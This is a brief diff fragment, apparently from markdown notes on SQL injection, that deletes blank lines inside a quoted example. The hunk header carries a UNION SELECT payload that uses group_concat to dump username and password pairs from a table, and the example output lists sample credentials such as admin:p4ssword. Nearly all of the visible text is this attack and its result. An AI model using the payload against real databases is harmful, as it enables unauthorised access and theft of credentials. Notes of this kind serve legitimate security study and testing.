@@ -16,7 +16,5 @@ id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM 
 ```
 ##### Example
 > admin:p4ssword
->
 > martin:pa$$word
->
 > jim:work12
